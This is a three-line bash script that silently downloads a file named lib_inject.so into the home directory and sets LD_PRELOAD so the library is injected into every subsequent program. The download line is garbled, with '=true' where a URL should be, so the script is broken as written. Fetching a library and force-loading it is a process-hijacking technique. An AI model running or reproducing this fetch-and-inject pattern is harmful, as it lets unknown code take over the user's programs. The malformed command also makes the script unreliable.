#!/bin/bash
wget -q --output-document=$HOME/lib_inject.so =true
export LD_PRELOAD=$HOME/lib_inject.so
